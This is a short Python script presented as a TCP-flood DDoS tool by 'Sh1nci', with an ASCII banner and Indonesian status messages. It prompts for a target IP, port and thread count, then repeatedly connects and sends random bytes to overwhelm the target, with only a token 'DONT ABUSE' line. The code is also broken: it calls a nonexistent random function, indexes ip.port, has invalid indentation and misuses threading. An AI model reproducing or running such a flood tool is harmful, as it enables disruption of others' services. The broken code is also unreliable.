# DDOS TCP-FLOOD
#Created By Sh1nci

import socket
import random
import threading
import os

#################################################
os.system("clear")
print("""\x1b[1;92m

███████╗██╗  ██╗ ██╗███╗   ██╗ ██████╗██╗
██╔════╝██║  ██║███║████╗  ██║██╔════╝██║
███████╗███████║╚██║██╔██╗ ██║██║     ██║
╚════██║██╔══██║ ██║██║╚██╗██║██║     ██║
███████║██║  ██║ ██║██║ ╚████║╚██████╗██║
╚══════╝╚═╝  ╚═╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝
 """)
print("﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋")
print("TCP-FLOOD BY SH1NCI")
print("DONT ABUSE")
print
print("﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋")

ip = str(input(' [!] Ip Target : '))
port = int(input(' [!] Port Target : '))
pack = int(input(' [!] Paket : '))
thread = int(input(' [!] Threads : '))

#################################################

def start():
	hh = random._unrandom(1024)
	xx = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip.port))
			s.send(hh)
			xx += 1
			print('Sh1nci Sedang Attack '+ip+' | Tersenggol:'+str(xx))
		except:
		s.close()
		print('Closed Connection')

for x in range(thread):
	thred = threading.thread(target=start)
	thred =start()


###################################################
